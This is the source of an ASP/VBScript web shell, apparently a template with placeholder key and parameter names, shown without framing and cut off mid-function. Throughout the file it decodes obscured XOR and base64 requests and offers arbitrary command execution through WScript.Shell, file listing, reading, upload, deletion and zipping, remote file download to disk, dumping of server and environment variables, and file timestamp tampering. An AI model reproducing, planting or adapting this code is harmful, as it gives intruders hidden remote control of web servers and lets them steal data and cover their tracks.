Set Parameters=Server.CreateObject("Scripting.Dictionary")
Dim g_param_name, g_secret_key, g_cookie_name
g_param_name = "$PARAM_NAME$"
g_secret_key = "$SECRET_KEY$"
g_cookie_name = "$COOKIE_NAME$"

Function NormalizeBase64(ByVal vCode)
	Dim padding
	if IsEmpty(vCode) or IsNull(vCode) then
		NormalizeBase64 = ""
		exit function
	end if
	padding = (4 - (Len(vCode) Mod 4)) Mod 4
	if padding > 0 then
		vCode = vCode & String(padding, "=")
	end if
	NormalizeBase64 = vCode
End Function

Function Stream_BinaryToStringLatin1(Binary)
	Const adTypeText = 2
	Const adTypeBinary = 1
	if IsEmpty(Binary) or IsNull(Binary) then
		Stream_BinaryToStringLatin1=""
	else
		Dim BinaryStream
		Set BinaryStream = CreateObject("ADODB.Stream")
		BinaryStream.Type = adTypeBinary
		BinaryStream.Open
		BinaryStream.Write Binary
		BinaryStream.Position = 0
		BinaryStream.Type = adTypeText
		BinaryStream.CharSet = "iso-8859-1"
		Stream_BinaryToStringLatin1 = BinaryStream.ReadText
	end if
	Set BinaryStream = Nothing
End Function

Function ReadRequestBodyText()
	Dim totalBytes, bin
	totalBytes = Request.TotalBytes
	if totalBytes <= 0 then
		ReadRequestBodyText = ""
		exit function
	end if
	bin = Request.BinaryRead(totalBytes)
	ReadRequestBodyText = Stream_BinaryToStringLatin1(bin)
End Function

Function IndexOfBytes(ByVal dataBytes, ByVal patternBytes, ByVal startPos)
	Dim dataLen, patternLen, i, j, matched
	On Error Resume Next
	if IsEmpty(dataBytes) or IsNull(dataBytes) then
		IndexOfBytes = -1
		exit function
	end if
	if IsEmpty(patternBytes) or IsNull(patternBytes) then
		IndexOfBytes = -1
		exit function
	end if
	dataLen = UBound(dataBytes) + 1
	patternLen = UBound(patternBytes) + 1
	if Err.Number <> 0 then
		Err.Clear
		IndexOfBytes = -1
		exit function
	end if
	if startPos < 0 then
		startPos = 0
	end if
	if patternLen <= 0 or dataLen < patternLen then
		IndexOfBytes = -1
		exit function
	end if
	For i = startPos To dataLen - patternLen
		matched = True
		For j = 0 To patternLen - 1
			if CByte(dataBytes(i + j)) <> CByte(patternBytes(j)) then
				matched = False
				Exit For
			end if
		Next
		if matched then
			IndexOfBytes = i
			exit function
		end if
	Next
	IndexOfBytes = -1
End Function

Function LastIndexOfBytes(ByVal dataBytes, ByVal patternBytes)
	Dim dataLen, patternLen, i, j, matched
	On Error Resume Next
	if IsEmpty(dataBytes) or IsNull(dataBytes) then
		LastIndexOfBytes = -1
		exit function
	end if
	if IsEmpty(patternBytes) or IsNull(patternBytes) then
		LastIndexOfBytes = -1
		exit function
	end if
	dataLen = UBound(dataBytes) + 1
	patternLen = UBound(patternBytes) + 1
	if Err.Number <> 0 then
		Err.Clear
		LastIndexOfBytes = -1
		exit function
	end if
	if patternLen <= 0 or dataLen < patternLen then
		LastIndexOfBytes = -1
		exit function
	end if
	For i = dataLen - patternLen To 0 Step -1
		matched = True
		For j = 0 To patternLen - 1
			if CByte(dataBytes(i + j)) <> CByte(patternBytes(j)) then
				matched = False
				Exit For
			end if
		Next
		if matched then
			LastIndexOfBytes = i
			exit function
		end if
	Next
	LastIndexOfBytes = -1
End Function

Function SliceBytes(ByVal sourceBytes, ByVal startPos, ByVal sliceLen)
	Const adTypeBinary = 1
	Dim stream
	if IsEmpty(sourceBytes) or IsNull(sourceBytes) then
		SliceBytes = Null
		exit function
	end if
	if startPos < 0 or sliceLen <= 0 then
		SliceBytes = Null
		exit function
	end if
	Set stream = CreateObject("ADODB.Stream")
	stream.Type = adTypeBinary
	stream.Open
	stream.Write sourceBytes
	if Err.Number <> 0 then
		Err.Clear
		stream.Close
		Set stream = Nothing
		SliceBytes = Null
		exit function
	end if
	if startPos > stream.Size then
		stream.Close
		Set stream = Nothing
		SliceBytes = Null
		exit function
	end if
	stream.Position = startPos
	SliceBytes = stream.Read(sliceLen)
	stream.Close
	Set stream = Nothing
End Function

Function HexToBinary(hexStr)
	Dim stream, i
	Set stream = CreateObject("ADODB.Stream")
	stream.Type = 1
	stream.Open
	For i = 1 To Len(hexStr) Step 2
		stream.Write ChrB(CLng("&H" & Mid(hexStr, i, 2)))
	Next
	stream.Position = 0
	HexToBinary = stream.Read
	Set stream = Nothing
End Function

Function StringToUtf8Bytes(ByVal s)
	Dim stm
	Set stm = CreateObject("ADODB.Stream")
	stm.Type = 2
	stm.Charset = "utf-8"
	stm.Open
	stm.WriteText s
	stm.Position = 0
	stm.Type = 1
	StringToUtf8Bytes = stm.Read
	stm.Close
	Set stm = Nothing
End Function

Function BytesToHex(bytes)
	Dim i, hexStr
	hexStr = ""
	For i = 0 To UBound(bytes)
		hexStr = hexStr & Right("0" & Hex(bytes(i)), 2)
	Next
	BytesToHex = LCase(hexStr)
End Function


Function XorBinary(dataBytes, keyStr)
	Dim keyLen, i, outBytes(), dataStr, dataByte, keyByte
	if IsEmpty(dataBytes) or IsNull(dataBytes) then
		XorBinary = dataBytes
		exit function
	end if
	keyLen = Len(keyStr)
	if keyLen <= 0 then
		XorBinary = dataBytes
		exit function
	end if
	if IsArray(dataBytes) then
		dataStr = Stream_BinaryToStringLatin1(dataBytes)
	else
		dataStr = CStr(dataBytes)
	end if
	if LenB(dataStr) = 0 then
		XorBinary = dataBytes
		exit function
	end if
	ReDim outBytes(LenB(dataStr) - 1)
	For i = 1 To LenB(dataStr)
		dataByte = AscB(MidB(dataStr, i, 1))
		keyByte = Asc(Mid(keyStr, ((i) Mod keyLen) + 1, 1))
		outBytes(i - 1) = CByte((CLng(dataByte) Xor CLng(keyByte)) And &HFF)
	Next
	XorBinary = outBytes
End Function

Function GetCookieValue(ByVal name)
	if IsEmpty(Request.Cookies(name)) then
		GetCookieValue = ""
	else
		GetCookieValue = Request.Cookies(name)
	end if
End Function

Function GenerateMarker(ByVal cookieValue, ByVal secretKey, ByRef leftMarker, ByRef rightMarker)
	leftMarker = Base64Encode(cookieValue & secretKey)
	leftMarker = Replace(leftMarker, "=", "")
	rightMarker = Base64Encode(cookieValue & secretKey)
	rightMarker = Replace(rightMarker, "=", "")
End Function

Function GenerateBinaryMarker(ByVal cookieValue, ByVal secretKey, ByRef leftMarkerBin, ByRef rightMarkerBin)
	leftMarkerBin = Stream_StringToBinary(cookieValue & secretKey)
	rightMarkerBin = Stream_StringToBinary(cookieValue & secretKey)
End Function



Function ConvertToWordArray(s)
	Dim lMessageLength, lNumberOfWords, lWordArray(), lBytePosition, lByteCount
	Dim lWordCount, lByte, byteArray
	byteArray = StrConv(s, 128)
	lMessageLength = LenB(byteArray)
	lNumberOfWords = (((lMessageLength + 8) - ((lMessageLength + 8) Mod 64)) / 64 + 1) * 16
	ReDim lWordArray(lNumberOfWords - 1)
	lByteCount = 0
	Do While lByteCount < lMessageLength
		lWordCount = lByteCount \ 4
		lBytePosition = (lByteCount Mod 4) * 8
		lByte = AscB(MidB(byteArray, lByteCount + 1, 1))
		lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift32(lByte, lBytePosition)
		lByteCount = lByteCount + 1
	Loop
	lWordCount = lByteCount \ 4
	lBytePosition = (lByteCount Mod 4) * 8
	lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift32(&H80, lBytePosition)
	lWordArray(lNumberOfWords - 2) = LShift32(lMessageLength, 3)
	lWordArray(lNumberOfWords - 1) = RShift32(lMessageLength, 29)
	ConvertToWordArray = lWordArray
End Function

Function LShift32(ByVal lValue, ByVal iShiftBits)
	LShift32 = ((lValue And &HFFFFFFFF) * (2 ^ iShiftBits)) And &HFFFFFFFF
End Function

Function RShift32(ByVal lValue, ByVal iShiftBits)
	RShift32 = Fix((lValue And &HFFFFFFFF) / (2 ^ iShiftBits))
End Function

Function AddUnsigned(lX, lY)
	Dim lX4, lY4, lX8, lY8, lResult
	lX8 = lX And &H80000000
	lY8 = lY And &H80000000
	lX4 = lX And &H40000000
	lY4 = lY And &H40000000
	lResult = (lX And &H3FFFFFFF) + (lY And &H3FFFFFFF)
	if (lX4 And lY4) Then
		lResult = lResult Xor &H80000000 Xor lX8 Xor lY8
	elseif (lX4 Or lY4) Then
		if (lResult And &H40000000) Then
			lResult = lResult Xor &HC0000000 Xor lX8 Xor lY8
		else
			lResult = lResult Xor &H40000000 Xor lX8 Xor lY8
		end if
	else
		lResult = lResult Xor lX8 Xor lY8
	end if
	AddUnsigned = lResult
End Function

Function F(x, y, z)
	F = (x And y) Or ((Not x) And z)
End Function
Function G(x, y, z)
	G = (x And z) Or (y And (Not z))
End Function
Function H(x, y, z)
	H = (x Xor y Xor z)
End Function
Function I(x, y, z)
	I = (y Xor (x Or (Not z)))
End Function

Function FF(a, b, c, d, x, s, ac)
	a = AddUnsigned(a, AddUnsigned(AddUnsigned(F(b, c, d), x), ac))
	FF = AddUnsigned(LShift32(a, s), b)
End Function
Function GG(a, b, c, d, x, s, ac)
	a = AddUnsigned(a, AddUnsigned(AddUnsigned(G(b, c, d), x), ac))
	GG = AddUnsigned(LShift32(a, s), b)
End Function
Function HH(a, b, c, d, x, s, ac)
	a = AddUnsigned(a, AddUnsigned(AddUnsigned(H(b, c, d), x), ac))
	HH = AddUnsigned(LShift32(a, s), b)
End Function
Function II(a, b, c, d, x, s, ac)
	a = AddUnsigned(a, AddUnsigned(AddUnsigned(I(b, c, d), x), ac))
	II = AddUnsigned(LShift32(a, s), b)
End Function

Function WordToHex(lValue)
	Dim lByte, lCount, lHex
	lHex = ""
	For lCount = 0 To 3
		lByte = RShift32(lValue, lCount * 8) And &HFF
		lHex = lHex & Right("0" & Hex(lByte), 2)
	Next
	WordToHex = lHex
End Function
Function Base64Encode(sText)
    Dim oXML, oNode
	if IsEmpty(sText) or IsNull(sText) then
		Base64Encode=""
	else
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    If IsArray(sText) Then
		oNode.nodeTypedValue = sText
	Else
		oNode.nodeTypedValue =Stream_StringToBinary(sText)
	End If
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
	end if
    Set oNode = Nothing
    Set oXML = Nothing
End Function

' XOR encryption/decryption using ADODB.Stream (stable approach from gsl.asp)
' content: byte array to encrypt/decrypt
' keyStr: encryption key string
' isBin: if true, return binary; if false, return text
Function decryption(content, keyStr, isBin)
	Dim size, i, result, keySize, BinaryStream
	keySize = Len(keyStr)
	
	if IsEmpty(content) or IsNull(content) then
		decryption = content
		exit function
	end if
	
	if keySize <= 0 then
		decryption = content
		exit function
	end if
	
	Set BinaryStream = CreateObject("ADODB.Stream")
	BinaryStream.CharSet = "iso-8859-1"
	BinaryStream.Type = 2
	BinaryStream.Open
	
	if IsArray(content) then
		size = UBound(content) + 1
		For i = 1 To size
			BinaryStream.WriteText chrw(ascb(midb(content, i, 1)) Xor Asc(Mid(keyStr, (i mod keySize) + 1, 1)))
		Next
	end if
	
	BinaryStream.Position = 0
	if isBin then
		BinaryStream.Type = 1
		decryption = BinaryStream.Read()
	else
		decryption = BinaryStream.ReadText()
	end if
	
	Set BinaryStream = Nothing
End Function

' Normalize a Variant() byte array into a real VT_UI1|VT_ARRAY.
' Some COM components (like MSXML nodeTypedValue) are picky about the exact array type.
Function EnsureUi1Bytes(vBytes)
	On Error Resume Next
	Dim i, bs, b

	if IsEmpty(vBytes) or IsNull(vBytes) then
		EnsureUi1Bytes = vBytes
		exit function
	end if
	if Not IsArray(vBytes) then
		EnsureUi1Bytes = vBytes
		exit function
	end if

	Set bs = CreateObject("ADODB.Stream")
	bs.Type = 1
	bs.Open
	For i = 0 To UBound(vBytes)
		b = CByte(vBytes(i))
		bs.Write ChrB(b)
	Next
	bs.Position = 0
	EnsureUi1Bytes = bs.Read
	Set bs = Nothing
End Function

' Use .NET to Base64-encode byte arrays (VT_UI1 | VT_ARRAY).
' This avoids MSXML nodeTypedValue type-mismatch issues on some IIS/VBScript environments.
Function Base64EncodeBytesDotNet(bytes)
	On Error Resume Next

	Dim i, b, bs, tf, outBytes, ascii, outText

	if IsEmpty(bytes) or IsNull(bytes) then
		Base64EncodeBytesDotNet = ""
		exit function
	end if
	if Not IsArray(bytes) then
		Base64EncodeBytesDotNet = ""
		exit function
	end if

	' Convert Variant() -> real VT_UI1 byte[] via ADODB.Stream (more COM/.NET friendly)
	Set bs = CreateObject("ADODB.Stream")
	bs.Type = 1
	bs.Open
	For i = 0 To UBound(bytes)
		b = CByte(bytes(i))
		bs.Write ChrB(b)
	Next
	bs.Position = 0
	bytes = bs.Read
	Set bs = Nothing
	if Err.Number <> 0 then
		Base64EncodeBytesDotNet = ""
		exit function
	end if

	Set tf = CreateObject("System.Security.Cryptography.ToBase64Transform")
	outBytes = tf.TransformFinalBlock(bytes, 0, UBound(bytes) + 1)
	Set tf = Nothing
	if Err.Number <> 0 then
		Base64EncodeBytesDotNet = ""
		exit function
	end if

	Set ascii = CreateObject("System.Text.ASCIIEncoding")
	outText = ascii.GetString(outBytes)
	Set ascii = Nothing
	if Err.Number <> 0 then
		Base64EncodeBytesDotNet = ""
		exit function
	end if

	outText = Replace(outText, vbCrLf, "")
	outText = Replace(outText, vbLf, "")
	Base64EncodeBytesDotNet = outText
End Function

Function Lsh(ByVal N, ByVal Bits)
  Lsh = N * (2 ^ Bits)
End Function

Function Base64DecodeEx(ByVal vCode,isbin)
    Dim oXML, oNode
	if IsEmpty(vCode) or IsNull(vCode) then
		Base64DecodeEx=""
	else
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    if not isbin then
		Base64DecodeEx = Stream_BinaryToString(oNode.nodeTypedValue)
	else
		Base64DecodeEx = oNode.nodeTypedValue
	end if
	end if
    Set oNode = Nothing
    Set oXML = Nothing
End Function
Function Base64Decode(ByVal vCode)
    Base64Decode=Base64DecodeEx(vCode,false)
End Function

'Stream_StringToBinary Function
'2003 Antonin Foller, http://www.motobit.com
'Text - string parameter To convert To binary data
Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1

  'Create Stream object
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")

  'Specify stream type - we want To save text/string data.
  BinaryStream.Type = adTypeText

  'Specify charset For the source text (unicode) data.
  BinaryStream.CharSet = "utf-8"

  'Open the stream And write text/string data To the object
  BinaryStream.Open
  BinaryStream.WriteText Text

  'Change stream type To binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary

  'Ignore first two bytes - sign of
  BinaryStream.Position = 3

  'Open the stream And get binary data from the object
  Stream_StringToBinary = BinaryStream.Read

  Set BinaryStream = Nothing
End Function

'Stream_BinaryToString Function
'2003 Antonin Foller, http://www.motobit.com
'Binary - VT_UI1 | VT_ARRAY data To convert To a string 
Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1

	if IsEmpty(Binary) or IsNull(Binary) then
		Stream_BinaryToString=""
	else
  'Create Stream object
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")

  'Specify stream type - we want To save binary data.
  BinaryStream.Type = adTypeBinary

  'Open the stream And write binary data To the object
  BinaryStream.Open
  BinaryStream.Write Binary

  'Change stream type To text/string
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText

  'Specify charset For the output text (unicode) data.
  BinaryStream.CharSet = "utf-8"

  'Open the stream And get text/string data from the object
  Stream_BinaryToString = BinaryStream.ReadText
	end if
  Set BinaryStream = Nothing
End Function
Function GetFso()
	Dim Fso,Key
	Key="Scripting.FileSystemObject"
	Set Fso=CreateObject(Key)
	if IsEmpty(Fso) then Set Fso=Hfso
	if Not IsEmpty(Fso) then Set GetFso=Fso
	Set Fso=RDS(Key)
	Set GetFso=Fso
End Function
Function RDS(COM)
	Set r=CreateObject("RDS.DataSpace")
	Set RDS=r.CreateObject(COM,"")
End Function
Function GetWS()
	Dim WS,Key
	Key="WScript.Shell"
	Set WS=CreateObject(Key)
	if Not IsEmpty(WS) then Set GetWS=WS
	if IsEmpty(WS) then	Set WS=Hws
	Set WS=RDS(Key)
	Set GetWS=WS
End Function
Function GetStream()
	Set GetStream=CreateObject("Adodb.Stream")
End Function
Function GetSA()
	Dim SA,Key
	Key="shell.application"
	Set SA=CreateObject(Key)
	if IsEmpty(SA) then	Set SA=HSA
	if Not IsEmpty(SA) then Set GetSA=SA
	Set SA=RDS(Key)
	Set GetSA=SA
End Function
	Function FromUnixTime(intTime, intTimeZone)
    If IsEmpty(intTime) or Not IsNumeric(intTime) Then
        FromUnixTime = Now()
        Exit Function
    End If         
    If IsEmpty(intTime) or Not IsNumeric(intTimeZone) Then intTimeZone = 0
    FromUnixTime = DateAdd("s", intTime, "1970-01-01 00:00:00")
    FromUnixTime = DateAdd("h", intTimeZone, FromUnixTime)
End Function
	Function getBasicsInfo()
		dim basicInfo
		dim FileRoot
		set wss=GetWS()
		set fso=GetFso()
		envlists="SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$PATHEXT$PROCESSOR_ARCHITECTURE$PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
		envlist=split(envlists,"$")
		For Each D in fso.Drives:FileRoot=FileRoot&D.DriveLetter&":/;":Next:
		basicInfo=basicInfo&"CurrentDir"&" : "&mid(request.ServerVariables("PATH_TRANSLATED"),1,InstrRev(request.ServerVariables("PATH_TRANSLATED"),"\"))&chr(10)
		basicInfo=basicInfo&"OsInfo"&" : "&wss.environment("system")("OS")&chr(10)
		basicInfo=basicInfo&"CurrentUser"&" : "&request.ServerVariables("LOGON_USER")&chr(10)
		basicInfo=basicInfo&"FileRoot"&" : "&FileRoot&chr(10)
		basicInfo=basicInfo&"scriptengine"&" : "&scriptengine&"/"&scriptenginemajorversion&"."&scriptengineminorversion&"."&scriptenginebuildversion&chr(10)
		basicInfo=basicInfo&"systemTime"&" : "&now()&chr(10)
		for each x in wss.environment("system"):basicInfo=basicInfo&x&chr(10):next
		for each x in Request.ServerVariables:basicInfo=basicInfo&x&" : "&Request.ServerVariables(x)&chr(10):next
		for each x in envlist:basicInfo=basicInfo&x&" : "&wss.expandenvironmentstrings("%"&x&"%")&chr(10):next
		set wss=nothing
		set fso=nothing
		getBasicsInfo=basicInfo
	End Function
	
	Function execCommand()
		on error resume Next
		Dim ws,sa,cmd
		cmd=getParameterValue("cmdLine")
		Set ws=server.createobject("WScript.shell")
		If IsEmpty(ws) Then
		Set ws=server.createobject("WScript.shell.1")
		End If
		If IsEmpty(ws) Then
		Set sa=server.createobject("shell.application")
		End If
		If IsEmpty(ws) And IsEmpty(sa) Then
		Set sa=server.createobject("shell.application.1")
		End If
		If Not IsEmpty(ws) Then
		Set process=ws.exec(cmd)
		cmdResult=process.stdout.readall
		cmdResult=cmdResult&process.stderr.readall
		message=cmdResult
		End If

		If Not IsEmpty(sa) Then
		sa.ShellExecute "cmd.exe","/c "&cmd,"","open",0
		End If
		execCommand=message
	End Function

	 
    
		Function getFile()
		Dim listResult,k
		path=getParameterValue("dirName")
		listResult="ok"
		listResult=listResult&chr(10)
		listResult=listResult&path
		listResult=listResult&chr(10)
		Dim fs,sa
		Set fso=server.createobject("Scripting.FileSystemObject")
		If IsEmpty(fso) Then
		Set fso=server.createobject("shell.application")
		End If

		Set pathObj = fso.GetFolder(path)
		Set fsofolders = pathObj.SubFolders
		Set fsofiles = pathObj.Files
		for each k in fsofolders
			listResult=listResult&k.name&chr(9)&"0"&chr(9)&k.datelastmodified&chr(9)&"4096"&chr(9)&k.attributes&chr(10)
			next
		for each k in fsofiles
			listResult=listResult&k.name&chr(9)&"1"&chr(9)&k.datelastmodified&chr(9)&k.size&chr(9)&k.attributes&chr(10)
			next
		getFile=listResult
	End Function

	Function readFile()
		Dim stream,fileContentType,path
		Set stream=GetStream()
		path=getParameterValue("fileName")
		stream.Open
		stream.Type=1
		stream.LoadFromFile(path)
		readFile=stream.Read()
		if	IsNull(readFile) or IsEmpty(readFile) then
			readFile="null"
		end if
		Set stream=Nothing
	End Function

	Function getFileSize()
		on error resume next
		Dim fileName, fso, file
		fileName = getParameterValue("fileName")
		if IsEmpty(fileName) or IsNull(fileName) or fileName = "" then
			getFileSize = "No parameter fileName"
			exit function
		end if
		set fso=GetFso()
		if Not fso.FileExists(fileName) then
			getFileSize = "file does not exist"
			exit function
		end if
		set file = fso.GetFile(fileName)
		getFileSize = file.size
		if Err then
			getFileSize = Err.Description
			Err.Clear
		end if
	End Function

	Function readFileByPosition()
		on error resume next
		Dim fileName, position, readByteNum
		Dim fso, BinaryStream, bytesRead
		fileName = getParameterValue("fileName")
		position = getParameterValue("position")
		readByteNum = getParameterValue("readByteNum")
		if IsEmpty(fileName) or IsNull(fileName) or fileName = "" _
			or IsEmpty(position) or IsNull(position) or position = "" _
			or IsEmpty(readByteNum) or IsNull(readByteNum) or readByteNum = "" then
			readFileByPosition = "No parameter fileName,position,readByteNum"
			exit function
		end if

		set fso=GetFso()
		if Not fso.FileExists(fileName) then
			readFileByPosition = "file does not exist"
			exit function
		end if

		Set BinaryStream = GetStream()
		BinaryStream.Type = 1
		BinaryStream.Open
		BinaryStream.LoadFromFile fileName
		BinaryStream.Position = CLng(position)
		if CLng(readByteNum) <= 0 then
			readFileByPosition = BinaryStream.Read(0)
		else
			readFileByPosition = BinaryStream.Read(CLng(readByteNum))
		end if
		Set BinaryStream=Nothing
		if Err then
			readFileByPosition = Err.Description
			Err.Clear
		end if
	End Function

	Function bigFileDownload()
		uploadResult=False
		Const adTypeBinary = 1
		Dim BinaryStream,path,position,readByteNum,mode,fso,file
		path=getParameterValue("fileName")
		mode=getParameterValue("mode")
		readByteNum=getParameterValue("readByteNum")
		position=getParameterValue("position")
		
		IF mode="fileSize" THEN
			Set fso=server.createobject("Scripting.FileSystemObject")
			If IsEmpty(fso) THEN
				Set fso=server.createobject("shell.application")
			End If
			Set file=fso.GetFile(path)
			bigFileDownload=file.size
		ElseIf mode="read" THEN
			Set BinaryStream = GetStream()
			BinaryStream.Type = adTypeBinary
			BinaryStream.Open
			BinaryStream.LoadFromFile path
			BinaryStream.Position = position
			bigFileDownload=BinaryStream.Read(readByteNum)
			Set BinaryStream=Nothing
		Else
			bigFileDownload="no mode"
		END IF
	End Function

	Function moveFile()
		dim srcFileName,destFileName,fso,result
		srcFileName=getParameterValue("srcFileName")
		destFileName=getParameterValue("destFileName")
		set fso=GetFso()
		if fso.FileExists(srcFileName) then
			fso.MoveFile srcFileName,destFileName
			result="ok"
		elseif fso.FolderExists(srcFileName) then
			fso.MoveFolder srcFileName,destFileName
			result="ok"
		end if
		if IsEmpty(result) then
			result="fail"
		end if
		moveFile=result
	End Function

	Function copyFile()
		dim srcFileName,destFileName,fso,result
		srcFileName=getParameterValue("srcFileName")
		destFileName=getParameterValue("destFileName")
		set fso=GetFso()
		if fso.FileExists(srcFileName) then
			fso.CopyFile srcFileName,destFileName
			result="ok"
		elseif fso.FolderExists(srcFileName) then
			fso.CopyFolder srcFileName,destFileName
			result="ok"
		end if
		if IsEmpty(result) then
			result="fail"
		end if
		copyFile=result
	End Function

	Function deleteFile()
		dim srcFileName,fso,result
		fileName=getParameterValue("fileName")
		set fso=GetFso()
		if fso.FileExists(fileName) then
			fso.DeleteFile(fileName)
			result="ok"
		elseif fso.FolderExists(fileName) then
			fso.DeleteFolder(fileName)
			result="ok"
		end if
		if IsEmpty(result) then
			result="fail"
		end if
		deleteFile=result
	End Function

	Function newFile()
		dim fileName,fso,result
		fileName=getParameterValue("fileName")
		set fso=GetFso()
		fso.CreateTextFile(fileName)
		result="ok"
		newFile=result
	End Function

	Function newDir()
		dim dirName,fso,result
		dirName=getParameterValue("dirName")
		set fso=GetFso()
		fso.CreateFolder(dirName)
		result="ok"
		newDir=result
	End Function

	Function uploadFile()
		uploadResult=False
		Const adTypeBinary = 1
		Const adSaveCreateOverWrite = 2
		Dim BinaryStream,path, content
		Set BinaryStream = GetStream()
		path=getParameterValue("fileName")
		content=getParameterValueEx("fileValue",true)  
		BinaryStream.Type = adTypeBinary
		BinaryStream.Open
		BinaryStream.Write content
  
  'Save binary data To disk
		BinaryStream.SaveToFile path, adSaveCreateOverWrite
		set BinaryStream = Nothing
		uploadFile="ok"
	End Function

	Function bigFileUpload()
		uploadResult=False
		Const adTypeBinary = 1
		Const adSaveCreateOverWrite = 2
		Dim BinaryStream,path, content
		Set BinaryStream = GetStream()
		path=getParameterValue("fileName")
		content=getParameterValueEx("fileContents",true)
		position=getParameterValue("position")
		BinaryStream.Type = adTypeBinary
		BinaryStream.Open
		BinaryStream.LoadFromFile path
		BinaryStream.Position = position
		BinaryStream.Write content
  
  'Save binary data To disk
		BinaryStream.SaveToFile path, adSaveCreateOverWrite
		Set BinaryStream=Nothing
		bigFileUpload="ok"
	End Function

	Function zip()
		on error resume next
		Dim compressPaths, compressFile, fso, sa, zipNs, pathArr, i, p
		Dim stream, startTime
		compressPaths=getParameterValue("compressPaths")
		compressFile=getParameterValue("compressFile")
		if IsEmpty(compressPaths) or IsNull(compressPaths) or compressPaths="" then
			zip="compressPaths or compressFile is null"
			exit function
		end if
		if IsEmpty(compressFile) or IsNull(compressFile) or compressFile="" then
			zip="compressPaths or compressFile is null"
			exit function
		end if

		set fso=GetFso()
		if Not fso.FileExists(compressFile) then
			Set stream=GetStream()
			stream.Type=1
			stream.Open
			stream.Write ChrB(&H50) & ChrB(&H4B) & ChrB(&H05) & ChrB(&H06)
			For i=1 To 18
				stream.Write ChrB(0)
			Next
			stream.SaveToFile compressFile,2
			Set stream=Nothing
		end if

		Set sa=Server.CreateObject("Shell.Application")
		Set zipNs=sa.NameSpace(compressFile)
		if IsEmpty(zipNs) then
			zip="zip namespace error"
			exit function
		end if

		if InStr(compressPaths,"|")>0 then
			pathArr=Split(compressPaths,"|")
		else
			ReDim pathArr(0)
			pathArr(0)=compressPaths
		end if

		For i=0 To UBound(pathArr)
			p=pathArr(i)
			if p<>"" then
				if fso.FileExists(p) or fso.FolderExists(p) then
					zipNs.CopyHere p,20
				else
					zip="path not exists"
					exit function
				end if
			end if
		Next

		startTime=Timer
		Do While zipNs.Items.Count=0 And (Timer-startTime)<5
		Loop
		zip="ok"
	End Function

	Function unzip()
		on error resume next
		Dim compressFile, extractDir, fso, ws, cmd, rc, cfEsc, edEsc
		compressFile=getParameterValue("compressFile")
		extractDir=getParameterValue("extractDir")
		if IsEmpty(compressFile) or IsNull(compressFile) or compressFile="" then
			unzip="compressFile or extractDir is null"
			exit function
		end if
		if IsEmpty(extractDir) or IsNull(extractDir) or extractDir="" then
			unzip="compressFile or extractDir is null"
			exit function
		end if

		set fso=GetFso()
		if Not fso.FileExists(compressFile) then
			unzip="compressFile not exists"
			exit function
		end if
		if Not fso.FolderExists(extractDir) then
			fso.CreateFolder extractDir
		end if

		Set ws = GetWS()
		if IsEmpty(ws) then
			unzip="wscript shell error"
			exit function
		end if
		cfEsc = Replace(compressFile, "'", "''")
		edEsc = Replace(extractDir, "'", "''")
		cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""$ErrorActionPreference='Stop';" & _
			"if (Get-Command Expand-Archive -ErrorAction SilentlyContinue) {" & _
			" Expand-Archive -LiteralPath '" & cfEsc & "' -DestinationPath '" & edEsc & "' -Force" & _
			"} else {" & _
			" Add-Type -AssemblyName System.IO.Compression.FileSystem;" & _
			" [System.IO.Compression.ZipFile]::ExtractToDirectory('" & cfEsc & "','" & edEsc & "')" & _
			"}"""
		rc = ws.Run(cmd, 0, True)
		if Err.Number <> 0 then
			unzip="unzip error:" & Err.Number & ":" & Err.Description
			Err.Clear
			exit function
		end if
		if rc <> 0 then
			unzip="unzip failed:" & rc
			exit function
		end if
		unzip="ok"
	End Function

	Function fileRemoteDown()
		dim x,s,SI,url,saveFile
		url=getParameterValue("url")
		saveFile=getParameterValue("saveFile")
		Set x=CreateObject("MSXML2.ServerXmlHttp")
		x.Open "GET",url,0
		x.Send()
		If Err Then
			SI="E: "&Err.Description
			Err.Clear
		Else
			set s=GetStream()
		s.Mode=3
		s.Type=1
		s.Open()
		s.Write x.ResponseBody
		s.SaveToFile saveFile,2
		If Err Then
			SI="E: "&Err.Description
			Err.Clear
		Else
			SI="ok"
		End If
		Set x=Nothing
		Set s=Nothing
		set BinaryStream = Nothing
		End If
		fileRemoteDown=SI
	End Function

	Function getParameterValue(key)
		getParameterValue=getParameterValueEx(key,false)
	End Function

	Function getParameterValueEx(key,isbin)
		dim vk
		vk=Parameters(key)
		if	not IsEmpty(vk) and not IsNull(vk) then
			if isbin then
				getParameterValueEx = vk
			else
				getParameterValueEx = Stream_BinaryToString(vk)
			end if
		end if
	End Function

	Function setFileAttr()
		dim attr,fileType,fileName,fso,file,result,SI
		attr=getParameterValue("attr")
		fileType=getParameterValue("type")
		fileName=getParameterValue("fileName")
		if fileType="fileBasicAttr" then 
			set fso=GetFso()
			set file=fso.getFile(fileName)
			file.attributes=attr
		elseif fileType="fileTimeAttr" then
			fileName=replace(fileName,"/","\")
			Dim parts, mTime, aTime, cTime, ws, cmd, escPath, psScript, rc
			parts = Split(attr, "|")
			if UBound(parts) >= 0 then mTime = parts(0)
			if UBound(parts) >= 1 then aTime = parts(1)
			if UBound(parts) >= 2 then cTime = parts(2)

			if Not IsEmpty(mTime) and Not IsNull(mTime) and LCase(CStr(mTime)) <> "none" and mTime <> "" then
